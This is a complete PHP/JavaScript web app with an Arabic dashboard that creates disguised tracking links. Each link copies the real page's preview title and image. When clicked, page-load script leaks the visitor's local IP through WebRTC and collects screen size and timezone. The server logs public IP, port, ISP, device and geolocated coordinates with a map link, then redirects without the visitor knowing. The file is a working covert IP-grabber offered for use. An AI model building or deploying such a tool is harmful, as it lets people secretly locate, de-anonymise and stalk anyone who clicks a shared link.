<?php
// ضبط المنطقة الزمنية للجزائر بدقة
date_default_timezone_set('Africa/Algiers');

// إظهار الأخطاء للتشخيص
ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        meta_title TEXT,
        meta_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        country TEXT, 
        city TEXT, 
        lat TEXT, 
        lon TEXT, 
        isp TEXT, 
        device_info TEXT, 
        screen_res TEXT, 
        timezone TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("خطأ في قاعدة البيانات: " . $e->getMessage());
}

// دالة سحب العنوان والصورة الأصلية ديناميكياً من أي موقع
function fetch_real_meta($url) {$title = "";
    $image = "";

    if (preg_match('/(?:youtube\.com\/(?:[^\/]+\/.+\/|(?:v|e(?:mbed)?)\/|.*[?&]v=)|youtu\.be\/)([^"&?\/\s]{11})/', $url,$matches)) {
        $video_id =$matches[1];
        $image = "https://img.youtube.com/vi/{$video_id}/hqdefault.jpg";
        
        $oembed_url = "https://www.youtube.com/oembed?url=" . urlencode($url) . "&format=json";
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$oembed_url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        $json = curl_exec($ch);
        curl_close($ch);
        
        if ($json) {
            $data = json_decode($json, true);
            if (isset($data['title'])) {
                $title =$data['title'];
            }
        }
    }

    if (empty($title)) {$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
        $html = curl_exec($ch);
        curl_close($ch);

        if ($html) {$dom = new DOMDocument();
            @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
            $xpath = new DOMXPath($dom);

            $titleNodes =$xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content');
            if ($titleNodes->length > 0) {
                $title =$titleNodes->item(0)->nodeValue;
            } else {
                $nodes =$dom->getElementsByTagName('title');
                if ($nodes->length > 0) {
                    $title =$nodes->item(0)->nodeValue;
                }
            }

            if (empty($image)) {
                $imageNodes =$xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content');
                if ($imageNodes->length > 0) {
                    $image =$imageNodes->item(0)->nodeValue;
                }
            }
        }
    }

    if (empty($title)) {
        $title = parse_url($url, PHP_URL_HOST);
    }
    if (empty($image)) {$image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
    }

    return ['title' => trim($title), 'image' => trim($image)];
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function parse_isp($isp_name, $org_name) {$combined = $isp_name . ' ' .$org_name;
    if (stripos($combined, 'Mobilis') !== false or stripos($combined, 'ATM') !== false) return 'Mobilis';
    if (stripos($combined, 'Djezzy') !== false or stripos($combined, 'Optimum Telecom') !== false) return 'Djezzy';
    if (stripos($combined, 'Ooredoo') !== false or stripos($combined, 'Wataniya') !== false) return 'Ooredoo';
    if (stripos($combined, 'Algérie Télécom') !== false or stripos($combined, 'Algerie Telecom') !== false or stripos($combined, 'AT') !== false) return 'Algérie Télécom';
    return trim($isp_name) ?: 'Unknown';
}

function get_device_type($ua) {$brand = 'Device';
    if (stripos($ua, 'Samsung') !== false)$brand = 'Samsung';
    elseif (stripos($ua, 'iPhone') !== false)$brand = 'iPhone';
    elseif (stripos($ua, 'Huawei') !== false)$brand = 'Huawei';
    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false)$brand = 'Xiaomi';
    elseif (stripos($ua, 'Oppo') !== false)$brand = 'Oppo';

    if (stripos($ua, 'Android') !== false) return$brand . ' - Android';
    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return$brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
    return 'Unknown Device';
}

function get_ip_details($ip) {
    if ($ip == '127.0.0.1' or $ip == '::1' or$ip == 'Unknown' or strpos($ip, '10.') === 0 or strpos($ip, '192.168.') === 0) {
        return ['country' => 'Algeria (Local)', 'city' => 'Local Network', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Localhost'];
    }
    $json = @file_get_contents("http://ip-api.com/json/" . $ip . "?fields=status,country,city,lat,lon,isp,org");
    $data = json_decode($json, true);
    if ($data and isset($data['status']) and$data['status'] == 'success') {
        return [
            'country' => $data['country'] ?? 'Unknown',
            'city' => $data['city'] ?? 'Unknown',
            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
            'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
        ];
    }
    return ['country' => 'Unknown', 'city' => 'Unknown', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Unknown'];
}

// 1. معالجة التوجيه
$og_title = "System Link";
$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";

if (isset($_GET['r'])) {
    $code =$_GET['r'];
    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link =$stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target =$link['target_url'];
        $og_title =$link['meta_title'];
        $og_image =$link['meta_image'];

        $public_ip = get_real_ip();$local_ip = $_GET['lip'] ?? 'N/A';$port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');

        if (isset($_GET['screen'])) {
            try {
                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
            } catch (Exception $e) {}

            header("Location: " . $target);
            exit();
        }
    } else {
        die("Link not found.");
    }
}

// 2. إنشاء رابط جديد
$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $meta = fetch_real_meta($target_url);

    $code = substr(md5(uniqid(rand(), true)), 0, 7);
    $stmt =$db->prepare("INSERT INTO links (code, target_url, meta_title, meta_image) VALUES (?, ?, ?, ?)");
    $stmt->execute([$code,$target_url, $meta['title'],$meta['image']]);

    $tracking_code =$code;
    $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
}

$total_links =$db->query("SELECT COUNT(*) FROM links")->fetchColumn();
$total_visits =$db->query("SELECT COUNT(*) FROM logs")->fetchColumn();

// فصل ملفات البحث والمعالجة
$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $logs =$stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($og_title); ?></title>
    
    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
    <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
    <meta property="og:type" content="website">

    <style>
        :root {
            --bg-main: #090d16;
            --bg-card: #111827;
            --border-color: #1f2937;
            --text-main: #f3f4f6;
            --text-muted: #9ca3af;
            --accent: #2563eb;
            --accent-hover: #1d4ed8;
            --success: #059669;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Inter, system-ui, -apple-system, sans-serif; }
        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; line-height: 1.6; }
        .wrapper { max-width: 1200px; margin: 0 auto; display: grid; gap: 24px; }
        
        header { display: flex; justify-content: space-between; align-items: center; background: var(--bg-card); border: 1px solid var(--border-color); padding: 20px 25px; border-radius: 12px; }
        header h1 { font-size: 18px; font-weight: 600; color: #fff; letter-spacing: -0.5px; }
        .metrics { display: flex; gap: 15px; }
        .metric-card { background: #030712; border: 1px solid var(--border-color); padding: 8px 16px; border-radius: 8px; text-align: center; }
        .metric-card span { display: block; font-size: 11px; color: var(--text-muted); text-transform: uppercase; }
        .metric-card strong { font-size: 15px; color: #fff; }

        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); }
        h2 { font-size: 15px; font-weight: 600; margin-bottom: 16px; color: #e5e7eb; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; }

        .form-row { display: flex; gap: 10px; position: relative; }
        input[type="text"] { flex: 1; background: #030712; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: #fff; font-size: 14px; outline: none; transition: border 0.2s; }
        input[type="text"]:focus { border-color: var(--accent); }
        
        .btn { background: var(--accent); color: white; border: none; padding: 0 20px; border-radius: 8px; font-weight: 500; cursor: pointer; transition: background 0.2s; text-decoration: none; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; white-space: nowrap; height: 46px; }
        .btn:hover { background: var(--accent-hover); }
        .btn-success { background: var(--success); }
        .btn-success:hover { background: #047857; }
        .btn-danger { background: #dc2626; }
        .btn-danger:hover { background: #b91c1c; }
        .btn-secondary { background: #374151; }
        .btn-secondary:hover { background: #4b5563; }

        .input-action-group { position: relative; flex: 1; display: flex; }
        .paste-btn { position: absolute; left: 10px; top: 50%; transform: translateY(-50%); background: #1f2937; color: var(--text-muted); border: none; padding: 6px 12px; font-size: 12px; border-radius: 6px; cursor: pointer; }
        .paste-btn:hover { color: #fff; background: #374151; }

        .result-panel { background: #030712; border: 1px solid var(--border-color); padding: 16px; border-radius: 8px; margin-top: 15px; }
        .result-panel label { display: block; font-size: 12px; color: var(--text-muted); margin-bottom: 6px; }
        .link-flex { display: flex; gap: 8px; }

        .toolbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; flex-wrap: wrap; gap: 10px; }
        .search-form { display: flex; gap: 8px; max-width: 350px; width: 100%; }

        .table-wrap { overflow-x: auto; border: 1px solid var(--border-color); border-radius: 8px; }
        table { width: 100%; border-collapse: collapse; text-align: right; font-size: 13px; min-width: 1000px; }
        th { background: #030712; color: var(--text-muted); padding: 12px 15px; border-bottom: 1px solid var(--border-color); font-weight: 500; white-space: nowrap; }
        td { padding: 12px 15px; border-bottom: 1px solid var(--border-color); color: #e5e7eb; white-space: nowrap; }
        tr:hover { background: rgba(31, 41, 55, 0.3); }
        
        .code-badge { background: rgba(5, 150, 105, 0.1); color: #34d399; padding: 4px 8px; border-radius: 4px; font-family: monospace; font-size: 12px; border: 1px solid rgba(5, 150, 105, 0.2); }
        .ip-public { font-family: monospace; color: #60a5fa; }
        .ip-local { font-family: monospace; color: #34d399; }
        .port-tag { font-family: monospace; color: #f43f5e; background: rgba(244, 63, 94, 0.1); padding: 2px 6px; border-radius: 4px; }
    </style>
    <script>
        function getLocalIP(callback) {
            let ips = [];
            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) { callback("N/A"); return; }
            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
            
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (myIP) {
                    let ip = myIP[1];
                    if (!ips.includes(ip)) {
                        ips.push(ip);
                        if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
                            callback(ip);
                            pc.onicecandidate = null;
                        }
                    }
                }
            };
            setTimeout(() => { if (ips.length === 0) callback("192.168.1.X"); }, 200);
        }

        document.addEventListener("DOMContentLoaded", function() {
            const urlParams = new URLSearchParams(window.location.search);
            const redirectCode = urlParams.get('r');
            const hasScreen = urlParams.has('screen');

            if (redirectCode && !hasScreen) {
                getLocalIP(function(localIp) {
                    const screenRes = screen.width + "x" + screen.height;
                    const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                    window.location.href = `/?r=${redirectCode}&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
                });
            }
        });

        async function pasteClipboard(inputName) {
            try {
                const text = await navigator.clipboard.readText();
                document.querySelector(`input[name="${inputName}"]`).value = text;
            } catch (err) {
                alert('فشل اللصق التلقائي، يرجى اللصق يدوياً (Ctrl+V)');
            }
        }

        function copyText(text, btnElement) {
            navigator.clipboard.writeText(text).then(() => {
                const original = btnElement.innerText;
                btnElement.innerText = "تم النسخ";
                btnElement.style.background = "#059669";
                setTimeout(() => {
                    btnElement.innerText = original;
                    btnElement.style.background = "";
                }, 2000);
            });
        }
    </script>
</head>
<body>
    <div class="wrapper">
        
        <!-- الهيدر والمعلومات -->
        <header>
            <div>
                <h1>لوحة التحكم والتشخيص المتقدم</h1>
            </div>
            <div class="metrics">
                <div class="metric-card">
                    <span>الروابط النشطة</span>
                    <strong><?php echo $total_links; ?></strong>
                </div>
                <div class="metric-card">
                    <span>إجمالي الزيارات</span>
                    <strong style="color: #34d399;"><?php echo $total_visits; ?></strong>
                </div>
            </div>
        </header>

        <!-- قسم توليد الروابط -->
        <section class="section-box">
            <h2>إنشاء رابط تعقب جديد</h2>
            <form method="POST" class="form-row">
                <div class="input-action-group">
                    <input type="text" name="target_url" placeholder="أدخل الرابط المستهدف هنا..." required>
                    <button type="button" class="paste-btn" onclick="pasteClipboard('target_url')">لصق</button>
                </div>
                <button type="submit" name="create" class="btn">توليد الرابط</button>
            </form>

            <?php if (!empty($generated_link)): ?>
                <div class="result-panel">
                    <label>رابط التعقب النشط:</label>
                    <div class="link-flex">
                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">نسخ الرابط</button>
                    </div>
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-top: 12px; font-size: 13px;">
                        <span style="color: var(--text-muted);">كود التعقب: <strong class="code-badge"><?php echo htmlspecialchars($tracking_code); ?></strong></span>
                        <a href="/?track=<?php echo htmlspecialchars($tracking_code); ?>" style="color: #60a5fa; text-decoration: none;">عرض إحصائيات هذا الكود فقط ←</a>
                    </div>
                </div>
            <?php endif; ?>
        </section>

        <!-- قسم السجلات الحية -->
        <section class="section-box">
            <div class="toolbar">
                <h2>سجلات الزيارات الحية</h2>
                <form method="GET" class="search-form">
                    <input type="text" name="track" placeholder="بحث بكود التعقب..." value="<?php echo htmlspecialchars($filter_code); ?>">
                    <button type="submit" class="btn" style="height: 42px;">بحث</button>
                    <?php if(!empty($filter_code)): ?>
                        <a href="/" class="btn btn-danger" style="height: 42px; text-decoration:none;">إلغاء</a>
                    <?php endif; ?>
                </form>
            </div>

            <div class="table-wrap">
                <table>
                    <thead>
                        <tr>
                            <th>#ID</th>
                            <th>الكود</th>
                            <th>IP العام</th>
                            <th>IP المحلي</th>
                            <th>المنفذ</th>
                            <th>الجهاز</th>
                            <th>الموقع الجغرافي</th>
                            <th>مزود الخدمة</th>
                            <th>الشاشة والمنطقة</th>
                            <th>الوقت (التوقيت الجزائري)</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($logs)): ?>
                            <tr><td colspan="10" style="text-align: center; color: var(--text-muted); padding: 30px;">لا توجد أي سجلات زيارات حتى الآن.</td></tr>
                        <?php else: ?>
                            <?php foreach ($logs as$log): ?>
                            <tr>
                                <td><?php echo $log['id']; ?></td>
                                <td>
                                    <span class="code-badge"><?php echo htmlspecialchars($log['code']); ?></span>
                                </td>
                                <td class="ip-public"><?php echo htmlspecialchars($log['public_ip'] ?? 'N/A'); ?></td>
                                <td class="ip-local"><?php echo htmlspecialchars($log['local_ip'] ?? 'N/A'); ?></td>
                                <td><span class="port-tag"><?php echo htmlspecialchars($log['port'] ?? 'N/A'); ?></span></td>
                                <td style="font-weight: 500; color: #fbbf24;"><?php echo htmlspecialchars($log['device_info']); ?></td>
                                <td>
                                    <span><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></span><br>
                                    <a href="https://www.google.com/maps?q=<?php echo htmlspecialchars($log['lat']); ?>,<?php echo htmlspecialchars($log['lon']); ?>" target="_blank" style="font-size: 11px; color: #34d399; text-decoration: none;">عرض الخريطة ↗</a>
                                </td>
                                <td style="color: #38bdf8;"><?php echo htmlspecialchars($log['isp']); ?></td>
                                <td><?php echo htmlspecialchars($log['screen_res']); ?></td>
                                <td style="color: #34d399; font-weight: 500;"><?php echo htmlspecialchars($log['created_at']); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </section>

    </div>
</body>
</html>
